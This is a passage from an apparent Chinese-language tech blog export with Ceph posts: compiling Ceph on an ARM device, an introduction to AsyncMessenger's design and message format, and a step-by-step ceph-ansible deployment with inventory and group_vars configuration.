--with-arch=armv7-a --with-float=hard --with-fpu=vfpv3-d16</span><br><span class="line">Thread model: posix</span><br><span class="line">gcc version 7.2.1 20180116 (GCC)</span><br></pre></td></tr></table></figure>

<h2 id="编译-1"><a href="#编译-1" class="headerlink" title="编译"></a>编译</h2><p>按照官方的文档，编译总共分为4步。</p>
<ol>
<li>安装编译需要的依赖包 <code>./install-deps.sh</code></li>
<li>使用cmake生成Makefile <code>./do_cmake.sh</code></li>
<li>使用Makefile编译源代码</li>
<li>安装包制作</li>
</ol>
<p>由于本人使用的是archlinux，简单查看了一下<code>install-deps.sh</code>这个脚本，发现没有与我使用os相匹配的处理；所以本人决定跳过第一步，并且我也不打算制作安装包，所以第四部也省略了。</p>
<p>接下来就只剩下第2、3步了，那么ceph编译依赖的其他软件包怎么解决，就只能放倒编译过程中出现报错再去究其原因了。闲言少叙，我们开始编译。</p>
<h3 id="cmake过程"><a href="#cmake过程" class="headerlink" title="cmake过程"></a>cmake过程</h3><p>从github上clone下来ceph代码，不需要取得submodule的代码，因为在<code>do_cmake.sh</code>中首先会做。执行<code>do_cmake.sh</code>后，先取submodule代码，然后创建build目录，并在build目录中执行cmake，生成Makefile。</p>
<p>在获取submodule这个过程由于网络问题会出现不只一次的中断，这个时候需要先删除<code>build</code>目录，然后在重新执行<code>do_cmake.sh</code>。</p>
<h3 id="make过程"><a href="#make过程" class="headerlink" title="make过程"></a>make过程</h3><p>ceph编译需要用到boost包，之前的版本都是需要用户手动安装，L版改为取源码自行编译了。可以先执行<code>make Boost</code>或直接执行<code>make</code>操作，我在编译boost的时候遇到了找不到<code>pyconfig.h</code>的编译错误，此时需要根据错误提示的文件及行数，找到对应的<code>cxxflags</code>并增加<code>-I/usr/include/python2.7/</code>这样再次执行<code>make</code>操作boost就能正常编译了。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Scanning dependencies of target ceph-dencoder</span><br><span class="line">[  0%] Building CXX object src/CMakeFiles/ceph-dencoder.dir/test/encoding/ceph_dencoder.cc.o</span><br><span class="line">c++: internal compiler error: Killed (program cc1plus)</span><br><span class="line">Please submit a full bug report,</span><br><span class="line">with preprocessed source if appropriate.</span><br><span class="line">See &lt;https://github.com/archlinuxarm/PKGBUILDs/issues&gt; for instructions.</span><br><span class="line">make[2]: *** [src/CMakeFiles/ceph-dencoder.dir/build.make:64: src/CMakeFiles/ceph-dencoder.dir/test/encoding/ceph_dencoder.cc.o] Error 4</span><br><span class="line">make[1]: *** [CMakeFiles/Makefile2:1609: src/CMakeFiles/ceph-dencoder.dir/all] Error 2</span><br><span class="line">make: *** [Makefile:141: all] Error 2</span><br></pre></td></tr></table></figure>
<p>由于我使用的是嵌入式设备，内存只有2g大小，并且没有配置swap，在编译过程中会遇到<code>g++: internal compiler error: Killed (program cc1plus)</code>错误，这种错误都是由于内存不足导致的。对于我的环境而言，只能通过增加swap来解决（<a href="https://wiki.archlinux.org/index.php/Swap">关于增加swap的方法</a>）。</p>
<p>问题解决了，就一路make下去吧。</p>
<h1 id="参考-鸣谢"><a href="#参考-鸣谢" class="headerlink" title="参考&amp;鸣谢"></a>参考&amp;鸣谢</h1><ul>
<li><a href="https://blog.csdn.net/BXD1314/article/details/47338391">解决: g++: internal compiler error: Killed (program cc1plus)</a></li>
<li><a href="https://superuser.com/questions/608410/building-boost-in-arch">Building Boost in Arch</a></li>
<li><a href="https://wiki.archlinux.org/index.php/Swap">Swap</a></li>
<li><a href="https://www.cnblogs.com/zhang-wen/p/6070626.html">rpmbuild用法</a></li>
<li><a href="https://www.cnblogs.com/schangech/p/5641108.html">RPM包rpmbuild SPEC文件深度说明 【装载】</a></li>
<li><a href="https://ceph.com/planet/%E7%BC%96%E8%AF%91%E7%9A%84ceph%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%96%87%E4%BB%B6%E8%BF%87%E5%A4%A7%E9%97%AE%E9%A2%98/">编译的Ceph二进制文件过大问题</a></li>
</ul>
]]></content>
      <categories>
        <category>storage</category>
      </categories>
      <tags>
        <tag>ceph</tag>
      </tags>
  </entry>
  <entry>
    <title>AsyncMessenger介绍</title>
    <url>/2020/11/11/storage/ceph/async-messenger-introduce/</url>
    <content><![CDATA[<p>说到Ceph的通讯一定绕不开Messenger，无论是客户端到OSD，还是OSD到MON，或者OSD到OSD，都需要Messenger来协助完成各个模块间消息的发送、接收。Messenger有三种实现，分别是SimpleMessenger、AsyncMessenger、XioMessenger，本文以AsyncMessenger为例简单介绍一下其工作原理。</p>
<h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><p><img src="/images/asyncmessenger/ceph-AsyncMessenger.png" alt="asyncmessenger"></p>
<ul>
<li><code>processors</code>线程数量由<code>cct-&gt;_conf-&gt;ms_async_op_threads</code>决定</li>
<li><code>NetworkStack</code>中<code>workers</code>与<code>processors</code>一一对应。</li>
<li><code>processors</code>收到请求会调创建<code>AsyncConnection</code>，并存入调用<code>AsyncConnection</code>实例的<code>accept</code>方法，<code>accept</code>通过<code>EventCenter</code>将由<code>NetworkStack</code>的<code>workers</code>调用<code>AsyncConnection</code>实例的<code>process</code>方法。(哈哈哈，绕吧，有点儿晕了吧～～～)</li>
<li><code>processors</code>处理完accept请求后，将<code>AsyncConnection</code>实例存入<code>accepting_conns</code>，等待<code>NetworkStack</code>处理完成。</li>
<li><code>AsyncConnection</code>的<code>process</code>被<code>NetworkStack</code>的<code>workers</code>线程调用，并构建<code>Message</code>消息通过<code>dispatch_queue</code>或<code>ms_fast_dispatch</code>发送到<code>fast_dispatchers</code>。</li>
</ul>
<h1 id="Message-格式"><a href="#Message-格式" class="headerlink" title="Message 格式"></a>Message 格式</h1><h2 id="CEPH-MSGR-TAG-MSG"><a href="#CEPH-MSGR-TAG-MSG" class="headerlink" title="CEPH_MSGR_TAG_MSG"></a>CEPH_MSGR_TAG_MSG</h2><p><img src="/images/asyncmessenger/ceph-message_format.png" alt="message_format"></p>
<ul>
<li>tag  <figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> CEPH_MSGR_TAG_READY         1  <span class="comment">/* server-&gt;client: ready for messages */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CEPH_MSGR_TAG_RESETSESSION  2  <span class="comment">/* server-&gt;client: reset, try again */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CEPH_MSGR_TAG_WAIT          3  <span class="comment">/* server-&gt;client: wait for racing incoming connection */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CEPH_MSGR_TAG_RETRY_SESSION 4  <span class="comment">/* server-&gt;client + cseq: try again with higher cseq */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CEPH_MSGR_TAG_RETRY_GLOBAL  5  <span class="comment">/* server-&gt;client + gseq: try again with higher gseq */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CEPH_MSGR_TAG_CLOSE         6  <span class="comment">/* closing pipe */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CEPH_MSGR_TAG_MSG           7  <span class="comment">/* message */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CEPH_MSGR_TAG_ACK           8  <span class="comment">/* message ack */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CEPH_MSGR_TAG_KEEPALIVE     9  <span class="comment">/* just a keepalive byte! */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CEPH_MSGR_TAG_BADPROTOVER  10  <span class="comment">/* bad protocol version */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CEPH_MSGR_TAG_BADAUTHORIZER 11 <span class="comment">/* bad authorizer */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CEPH_MSGR_TAG_FEATURES      12 <span class="comment">/* insufficient features */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CEPH_MSGR_TAG_SEQ           13 <span class="comment">/* 64-bit int follows with seen seq number */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CEPH_MSGR_TAG_KEEPALIVE2     14</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CEPH_MSGR_TAG_KEEPALIVE2_ACK 15  <span class="comment">/* keepalive reply */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CEPH_MSGR_TAG_CHALLENGE_AUTHORIZER 16  <span class="comment">/* ceph v2 doing server challenge */</span></span></span><br></pre></td></tr></table></figure>
  ** 我觉得注释处的说明写的很清楚了，此处不做过多说明了。 **</li>
<li>header  <figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">ceph_msg_header</span> &#123;</span><br><span class="line">    __le64 seq;       <span class="comment">/* message seq# for this session */</span></span><br><span class="line">    __le64 tid;       <span class="comment">/* transaction id */</span></span><br><span class="line">    __le16 type;      <span class="comment">/* message type */</span></span><br><span class="line">    __le16 priority;  <span class="comment">/* priority.  higher value == higher priority */</span></span><br><span class="line">    __le16 version;   <span class="comment">/* version of message encoding */</span></span><br><span class="line"></span><br><span class="line">    __le32 front_len; <span class="comment">/* bytes in main payload */</span></span><br><span class="line">    __le32 middle_len;<span class="comment">/* bytes in middle payload */</span></span><br><span class="line">    __le32 data_len;  <span class="comment">/* bytes of data payload */</span></span><br><span class="line">    __le16 data_off;  <span class="comment">/* sender: include full offset;</span></span><br><span class="line"><span class="comment">                 receiver: mask against ~PAGE_MASK */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">ceph_entity_name</span> src;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* oldest code we think can decode this.  unknown if zero. */</span></span><br><span class="line">    __le16 compat_version;</span><br><span class="line">    __le16 reserved;</span><br><span class="line">    __le32 crc;       <span class="comment">/* header crc32c */</span></span><br><span class="line">&#125; __attribute__ ((packed));</span><br></pre></td></tr></table></figure></li>
<li>payload<br>  *** 未知 ***</li>
<li>middle<br>  *** 未知 ***</li>
<li>data<br>  具体传递的数据内容，数据大小由<code>header</code>中的<code>data_len</code>决定。</li>
<li>footer&#x2F;old_footer  <figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * follows data payload</span></span><br><span class="line"><span class="comment"> * ceph_msg_footer_old does not support digital signatures on messages PLR</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">ceph_msg_footer_old</span> &#123;</span><br><span class="line">    __le32 front_crc, middle_crc, data_crc;</span><br><span class="line">    __u8 flags;</span><br><span class="line">&#125; __attribute__ ((packed));</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">ceph_msg_footer</span> &#123;</span><br><span class="line">    __le32 front_crc, middle_crc, data_crc;</span><br><span class="line">    <span class="comment">// sig holds the 64 bits of the digital signature for the message PLR</span></span><br><span class="line">    __le64  sig;</span><br><span class="line">    __u8 flags;</span><br><span class="line">&#125; __attribute__ ((packed));</span><br></pre></td></tr></table></figure>
  <code>footer</code>与<code>old_footer</code>之差一个签名<code>sig</code></li>
</ul>
]]></content>
      <categories>
        <category>storage</category>
      </categories>
      <tags>
        <tag>cepsager</tag>
      </tags>
  </entry>
  <entry>
    <title>ceph-ansible 使用</title>
    <url>/2019/09/28/storage/ceph/ceph-ansible-usage/</url>
    <content><![CDATA[<p>Ceph的部署有很多种，从最早的手动部署，到后来的Ceph-deploy，再到目前比较火的容器部署等等。但能作为生产环境部署的却不多，其中Ceph-ansible算是生产环境部署的方法之一。Ceph-ansible是基于ansible工具完成Ceph部署的。对于生产环境中动则几十、成百上千的节点数量如果一台一台安装配置效率太低。引入ansible工具可以快速完成Ceph集群的安装配置，大大提高效率。让运维人员从机械重复的工作中解脱出来。</p>
<h1 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h1><h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>三个节点，其中一个节点用作ansible和Ceph节点的复用节点。</p>
<table>
<thead>
<tr>
<th align="center">节点IP</th>
<th align="center">节点角色</th>
<th align="center">OS</th>
</tr>
</thead>
<tbody><tr>
<td align="center">172.30.12.137</td>
<td align="center">ansible节点、ceph节点</td>
<td align="center">CentOS Linux release 7.7.1908</td>
</tr>
<tr>
<td align="center">172.30.12.197</td>
<td align="center">ceph节点</td>
<td align="center">CentOS Linux release 7.7.1908</td>
</tr>
<tr>
<td align="center">172.30.12.227</td>
<td align="center">ceph节点</td>
<td align="center">CentOS Linux release 7.7.1908</td>
</tr>
</tbody></table>
<p>本文中使用的ansible工具运行在一个 CentOS7.6.1810 的容器内。</p>
<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>ceph-ansible是基于ansible工作的，所以要先安装ansible。既然要安装ansible，首先要先搞清楚安装哪个版本？</p>
<p>本文部署的Ceph版本为<code>mimic</code>，官方推荐可以使用<code>stable-3.1</code>和<code>stable-3.2</code>，我选择了较新的<code>stable-3.2</code>，<code>stable-3.2</code>对应的ansible版本为2.6。（更多关于版本对应关系请见<a href="https://docs.ceph.com/ceph-ansible/master/#releases">官网</a>）</p>
<p>选择完了ansible版本接下来就可以安装了，安装分为两种方式</p>
<ul>
<li>pip 安装</li>
<li>yum&#x2F;apt 安装</li>
</ul>
<p>由于 yum&#x2F;apt 安装版本选择范围比较狭窄，所以本人推荐使用 pip 安装。(关于pip安装请见<a href="https://pip.pypa.io/en/stable/installing/">pypa官网</a>)</p>
<p>首先clone ceph-ansible project</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">git <span class="built_in">clone</span> git@github.com:ceph/ceph-ansible.git</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">git checkout -b 3.2.0 v3.2.0</span></span><br></pre></td></tr></table></figure>
<p>然后使用ceph-ansible中推荐的<code>requirements.txt</code>安装对应版本的ansible</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">pip install -r ./ceph-ansible/requirements.txt</span><br></pre></td></tr></table></figure>
<p>待安装完成后，查看确认ansible版本</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">ansible --version</span></span><br><span class="line">ansible 2.6.19</span><br><span class="line">  config file = /root/ceph-ansible/ansible.cfg</span><br><span class="line">  configured module search path = [u&#x27;/root/.ansible/plugins/modules&#x27;, u&#x27;/usr/share/ansible/plugins/modules&#x27;]</span><br><span class="line">  ansible python module location = /usr/lib/python2.7/site-packages/ansible</span><br><span class="line">  executable location = /usr/bin/ansible</span><br><span class="line">  python version = 2.7.5 (default, Oct 30 2018, 23:45:53) [GCC 4.8.5 20150623 (Red Hat 4.8.5-36)]</span><br></pre></td></tr></table></figure>

<h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><h3 id="ansible-配置"><a href="#ansible-配置" class="headerlink" title="ansible 配置"></a>ansible 配置</h3><p>ansible inventory 自定义的配置可以放置在任何位置，只是在运行ansible时增加<code>-i &#123;inventory host path&#125;</code>指定其路径即可。若不指定inventory文件，ansible将去<code>/etc/ansible/hosts</code>这个路径去找。</p>
<p>inventory配置：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[mons]</span><br><span class="line">172.30.12.197 ansible_ssh_user=root ansible_ssh_pass=1234\$\#</span><br><span class="line"></span><br><span class="line">[osds]</span><br><span class="line">172.30.12.137 ansible_ssh_user=root ansible_ssh_pass=1234\$\#</span><br><span class="line">172.30.12.197 ansible_ssh_user=root ansible_ssh_pass=1234\$\#</span><br><span class="line"></span><br><span class="line">[mgrs]</span><br><span class="line">172.30.12.137 ansible_ssh_user=root ansible_ssh_pass=1234\$\#</span><br></pre></td></tr></table></figure>
<p>密码中若存在特殊字符<code>$</code>,<code>#</code>等，需要使用<code>\\</code>进行转义。<br>配置完成后，可使用<code>ansible all -i &#123;inventory host&#125; -m ping</code>测试节点连通情况</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">ansible all -i dummy-ansible-hosts -m ping</span></span><br><span class="line">172.30.12.197 | SUCCESS =&gt; &#123;</span><br><span class="line">    &quot;changed&quot;: false,</span><br><span class="line">    &quot;ping&quot;: &quot;pong&quot;</span><br><span class="line">&#125;</span><br><span class="line">172.30.12.227 | SUCCESS =&gt; &#123;</span><br><span class="line">    &quot;changed&quot;: false,</span><br><span class="line">    &quot;ping&quot;: &quot;pong&quot;</span><br><span class="line">&#125;</span><br><span class="line">172.30.12.137 | SUCCESS =&gt; &#123;</span><br><span class="line">    &quot;changed&quot;: false,</span><br><span class="line">    &quot;ping&quot;: &quot;pong&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="ceph-ansible-配置"><a href="#ceph-ansible-配置" class="headerlink" title="ceph-ansible 配置"></a>ceph-ansible 配置</h3><p>ceph-ansible的配置，主要是对group变量的配置，一般场景中我们不需要修改role。</p>
<h4 id="配置-all-yml"><a href="#配置-all-yml" class="headerlink" title="配置 all.yml"></a>配置 all.yml</h4><p>首先：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cp ./gourp_vars/all.yml.sample ./gourp_vars/all.yml</span><br></pre></td></tr></table></figure>

<p>然后，修改<code>all.yml</code>中的配置，如下：</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Inventory host group variables</span></span><br><span class="line"><span class="attr">mon_group_name:</span> <span class="string">mons</span></span><br><span class="line"><span class="attr">osd_group_name:</span> <span class="string">osds</span></span><br><span class="line"><span class="comment">#rgw_group_name: rgws</span></span><br><span class="line"><span class="comment">#mds_group_name: mdss</span></span><br><span class="line"><span class="comment">#nfs_group_name: nfss</span></span><br><span class="line"><span class="comment">#restapi_group_name: restapis</span></span><br><span class="line"><span class="comment">#rbdmirror_group_name: rbdmirrors</span></span><br><span class="line"><span class="comment">#client_group_name: clients</span></span><br><span class="line"><span class="comment">#iscsi_gw_group_name: iscsigws</span></span><br><span class="line"><span class="comment">#mgr_group_name: mgrs</span></span><br><span class="line"><span class="comment"># 上述 Inventory host 相关变量的默认值与 Inventory配置中的标签名一致，也就是说这里注释打开与否没有影响</span></span><br><span class="line"><span class="string">...</span></span><br><span class="line"><span class="comment"># If configure_firewall is true, then ansible will try to configure the</span></span><br><span class="line"><span class="comment"># appropriate firewalling rules so that Ceph daemons can communicate</span></span><br><span class="line"><span class="comment"># with each others.</span></span><br><span class="line"><span class="comment">#configure_firewall: True</span></span><br><span class="line"><span class="attr">configure_firewall:</span> <span class="literal">False</span></span><br><span class="line"><span class="comment"># 建议Firewall配不明白的同学将Firewall关闭，免得找麻烦。</span></span><br><span class="line"><span class="string">...</span></span><br><span class="line"><span class="comment"># Set type of NTP client daemon to use, valid entries are chronyd, ntpd or timesyncd</span></span><br><span class="line"><span class="comment"># Note that this selection is currently ignored on containerized deployments</span></span><br><span class="line"><span class="comment">#ntp_daemon_type: timesyncd</span></span><br><span class="line"><span class="attr">ntp_daemon_type:</span> <span class="string">chronyd</span></span><br><span class="line"><span class="comment"># Ceph需要做时间同步，具体用什么做可根据自己环境来选择。目前提供支持的有三种 chronyd, ntpd, timesyncd</span></span><br><span class="line"><span class="string">...</span></span><br><span class="line"><span class="comment"># ORIGIN SOURCE</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Choose between:</span></span><br><span class="line"><span class="comment"># - &#x27;repository&#x27; means that you will get ceph installed through a new repository. Later below choose between &#x27;community&#x27;, &#x27;rhcs&#x27;, &#x27;dev&#x27; or &#x27;obs&#x27;</span></span><br><span class="line"><span class="comment"># - &#x27;distro&#x27; means that no separate repo file will be added</span></span><br><span class="line"><span class="comment">#  you will get whatever version of Ceph is included in your Linux distro.</span></span><br><span class="line"><span class="comment"># &#x27;local&#x27; means that the ceph binaries will be copied over from the local machine</span></span><br><span class="line"><span class="comment">#ceph_origin: dummy</span></span><br><span class="line"><span class="attr">ceph_origin:</span> <span class="string">repository</span></span><br><span class="line"><span class="comment">#valid_ceph_origins:</span></span><br><span class="line"><span class="comment">#  - repository</span></span><br><span class="line"><span class="comment">#  - distro</span></span><br><span class="line"><span class="comment">#  - local</span></span><br><span class="line"></span><br><span class="line"><span class="attr">ceph_repository:</span> <span class="string">community</span></span><br><span class="line"><span class="comment">#valid_ceph_repository:</span></span><br><span class="line"><span class="comment">#  - community</span></span><br><span class="line"><span class="comment">#  - rhcs</span></span><br><span class="line"><span class="comment">#  - dev</span></span><br><span class="line"><span class="comment">#  - uca</span></span><br><span class="line"><span class="comment">#  - custom</span></span><br><span class="line"><span class="comment">#  - obs</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># REPOSITORY: COMMUNITY VERSION</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Enabled when ceph_repository == &#x27;community&#x27;</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#ceph_mirror: http://download.ceph.com</span></span><br><span class="line"><span class="comment">#ceph_stable_key: https://download.ceph.com/keys/release.asc</span></span><br><span class="line"><span class="comment">#ceph_stable_release: dummy</span></span><br><span class="line"><span class="comment">#ceph_stable_repo: &quot;&#123;&#123; ceph_mirror &#125;&#125;/debian-&#123;&#123; ceph_stable_release &#125;&#125;&quot;</span></span><br><span class="line"><span class="attr">ceph_mirror:</span> <span class="string">http://mirrors.163.com/ceph</span></span><br><span class="line"><span class="attr">ceph_stable_key:</span> <span class="string">https://mirrors.163.com/ceph/keys/release.asc</span></span><br><span class="line"><span class="attr">ceph_stable_release:</span> <span class="string">mimic</span></span><br><span class="line"><span class="attr">ceph_stable_repo:</span> <span class="string">&quot;<span class="template-variable">&#123;&#123; ceph_mirror &#125;&#125;</span>/rpm-<span class="template-variable">&#123;&#123; ceph_stable_release &#125;&#125;</span>&quot;</span></span><br><span class="line"><span class="comment"># Ceph 软件包的安装方式，有三种，repository使用一个新的源进行安装；distro使用linux发行版自带的源进行安装；local使用本地安装包的形式进行安装。</span></span><br><span class="line"><span class="comment"># 具体情况根据自身要求而定吧。</span></span><br><span class="line"><span class="string">...</span></span><br><span class="line"><span class="comment">## Monitor options</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># You must define either monitor_interface, monitor_address or monitor_address_block.</span></span><br><span class="line"><span class="comment"># These variables must be defined at least in all.yml and overrided if needed (inventory host file or group_vars/*.yml).</span></span><br><span class="line"><span class="comment"># Eg. If you want to specify for each monitor which address the monitor will bind to you can set it in your **inventory host file** by using &#x27;monitor_address&#x27; variable.</span></span><br><span class="line"><span class="comment"># Preference will go to monitor_address if both monitor_address and monitor_interface are defined.</span></span><br><span class="line"><span class="comment">#monitor_interface: interface</span></span><br><span class="line"><span class="attr">monitor_interface:</span> <span class="string">ens33</span></span><br><span class="line"><span class="comment">#monitor_address: 0.0.0.0</span></span><br><span class="line"><span class="comment">#monitor_address_block: subnet</span></span><br><span class="line"><span class="comment"># set to either ipv4 or ipv6, whichever your network is using</span></span><br><span class="line"><span class="comment">#ip_version: ipv4</span></span><br><span class="line"><span class="comment">#mon_use_fqdn: false # if set to true, the MON name used will be the fqdn in the ceph.conf</span></span><br><span class="line"><span class="comment"># Monitor的配置，必须要在 interface, address, address_block 中选择一个定义。（更多使用方法，请仔细阅读上面的英文吧。）</span></span><br><span class="line"><span class="string">...</span></span><br><span class="line"><span class="comment">## OSD options</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#is_hci: false</span></span><br><span class="line"><span class="comment">#hci_safety_factor: 0.2</span></span><br><span class="line"><span class="comment">#non_hci_safety_factor: 0.7</span></span><br><span class="line"><span class="comment">#osd_memory_target: 4294967296</span></span><br><span class="line"><span class="comment">#journal_size: 5120 # OSD journal size in MB</span></span><br><span class="line"><span class="attr">journal_size:</span> <span class="number">1024</span> <span class="comment"># OSD journal size in MB</span></span><br><span class="line"><span class="comment">#block_db_size: -1 # block db size in bytes for the ceph-volume lvm batch. -1 means use the default of &#x27;as big as possible&#x27;.</span></span><br><span class="line"><span class="comment">#public_network: 0.0.0.0/0</span></span><br><span class="line"><span class="attr">public_network:</span> <span class="number">172.30</span><span class="number">.12</span><span class="number">.0</span><span class="string">/24</span></span><br><span class="line"><span class="attr">cluster_network:</span> <span class="number">172.30</span><span class="number">.12</span><span class="number">.0</span><span class="string">/24</span></span><br><span class="line"><span class="comment">#cluster_network: &quot;&#123;&#123; public_network | regex_replace(&#x27; &#x27;, &#x27;&#x27;) &#125;&#125;&quot;</span></span><br><span class="line"><span class="comment">#osd_mkfs_type: xfs</span></span><br><span class="line"><span class="comment">#osd_mkfs_options_xfs: -f -i size=2048</span></span><br><span class="line"><span class="comment">#osd_mount_options_xfs: noatime,largeio,inode64,swalloc</span></span><br><span class="line"><span class="comment">#osd_objectstore: bluestore</span></span><br><span class="line"><span class="attr">osd_objectstore:</span> <span class="string">filestore</span></span><br><span class="line"><span class="comment"># 根据硬盘的存储介质与速度决定Journal size的大小；配置public,cluster newtwork；选择objectstore filestore or bluestore</span></span><br><span class="line"><span class="string">...</span></span><br></pre></td></tr></table></figure>

<h4 id="配置-osds-yml"><a href="#配置-osds-yml" class="headerlink" title="配置 osds.yml"></a>配置 osds.yml</h4><p>首先</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cp ./gourp_vars/osds.yml.sample ./gourp_vars/osds.yml</span><br></pre></td></tr></table></figure>
<p>然后，修改<code>osds.yml</code>配置，如下：</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">...</span></span><br><span class="line"><span class="comment"># Even though OSD nodes should not have the admin key</span></span><br><span class="line"><span class="comment"># at their disposal, some people might want to have it</span></span><br><span class="line"><span class="comment"># distributed on OSD nodes. Setting &#x27;copy_admin_key&#x27; to &#x27;true&#x27;</span></span><br><span class="line"><span class="comment"># will copy the admin key to the /etc/ceph/ directory</span></span><br><span class="line"><span class="comment">#copy_admin_key: false</span></span><br><span class="line"><span class="attr">copy_admin_key:</span> <span class="literal">true</span></span><br><span class="line"><span class="comment"># 根据个人喜好来吧，我喜欢各个OSD节点都有admin key</span></span><br><span class="line"><span class="string">...</span></span><br><span class="line"><span class="comment"># Declare devices to be used as OSDs</span></span><br><span class="line"><span class="comment"># All scenario(except 3rd) inherit from the following device declaration</span></span><br><span class="line"><span class="comment"># <span class="doctag">Note:</span> This scenario uses the ceph-disk tool to provision OSDs</span></span><br><span class="line"></span><br><span class="line"><span class="attr">devices:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">/dev/sdb</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">/dev/sdc</span></span><br><span class="line">  <span class="comment">#  - /dev/sdd</span></span><br><span class="line">  <span class="comment">#  - /dev/sde</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#devices: []</span></span><br><span class="line"><span class="comment"># 根据主机情况配置硬盘路径相关信息</span></span><br><span class="line"><span class="string">...</span></span><br><span class="line"><span class="attr">osd_scenario:</span> <span class="string">collocated</span></span><br><span class="line"><span class="comment">#valid_osd_scenarios:</span></span><br><span class="line"><span class="comment">#  - collocated</span></span><br><span class="line"><span class="comment">#  - non-collocated</span></span><br><span class="line"><span class="comment">#  - lvm</span></span><br><span class="line"><span class="comment"># collocated是将日志和数据部署到同一个硬盘上；non-collocated是分硬盘部署日志和数据；这两个选项都是使用ceph-disk创建的。</span></span><br><span class="line"><span class="comment"># lvm使用ceph-volume创建osd，需要指定vg、lvm等信息。</span></span><br><span class="line"><span class="comment"># 此处具体信息，请见`osds.yml.sample`里面有很详细的注解。</span></span><br><span class="line"><span class="string">...</span></span><br></pre></td></tr></table></figure>

<h4 id="配置-mgrs-yml"><a href="#配置-mgrs-yml" class="headerlink" title="配置 mgrs.yml"></a>配置 mgrs.yml</h4><p>首先</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cp ./gourp_vars/mgrs.yml.sample ./gourp_vars/mgrs.yml</span><br></pre></td></tr></table></figure>
<p>然后，修改<code>mgrs.yml</code>配置，如下：</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">...</span></span><br><span class="line"><span class="comment">###########</span></span><br><span class="line"><span class="comment"># MODULES #</span></span><br><span class="line"><span class="comment">###########</span></span><br><span class="line"><span class="comment"># Ceph mgr modules to enable, current modules available are: status,dashboard,localpool,restful,zabbix,prometheus,influx</span></span><br><span class="line"><span class="attr">ceph_mgr_modules:</span> [<span class="string">status</span>]</span><br><span class="line"><span class="string">...</span></span><br></pre></td></tr></table></figure>

<h2 id="部署"><a href="#部署" class="headerlink" title="部署"></a>部署</h2><h3 id="集群初始化部署"><a href="#集群初始化部署" class="headerlink" title="集群初始化部署"></a>集群初始化部署</h3><p>首先</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cp ./site.yml.sample ./site.yml</span><br></pre></td></tr></table></figure>
<p>然后</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ansible-playbook -i &#123;inventory host&#125; site.yml</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>部署过程需要下载RPM包安装，所以网速对部署速度的影响很大。请耐心等待。</p>
<h3 id="增加OSD节点部署"><a href="#增加OSD节点部署" class="headerlink" title="增加OSD节点部署"></a>增加OSD节点部署</h3><p>首先</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cp ./infrastructure-playbooks/add-osd.yml ./add-osd.yml</span><br></pre></td></tr></table></figure>
<p>然后，修改inventory host文件，在<code>[osds]</code>中增加<code>172.30.12.227</code>这条记录，相当于增加一个osd节点。</p>
